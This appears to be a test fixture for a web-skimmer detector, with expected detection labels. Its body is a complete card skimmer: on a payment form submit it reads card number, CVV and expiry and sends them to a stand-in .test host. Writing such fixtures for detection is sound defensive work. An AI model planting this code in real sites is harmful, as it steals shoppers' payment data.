// Synthetic test fixture: not functional malware. Hosts use the reserved .test TLD.
// context: script_host=cdn.vendor.test site=shop.example.test
// expect: skimmer.card_data=high skimmer.form_data=high
(function () {
  var form = document.getElementById("payment-form");
  form.addEventListener("submit", function () {
    var data = {
      n: document.querySelector("#cc-number").value,
      c: document.querySelector("input[name=cvv]").value,
      e: document.querySelector("#cc-exp").value
    };
    navigator.sendBeacon("https://collect.skim.test/c", JSON.stringify(data));
  });
})();
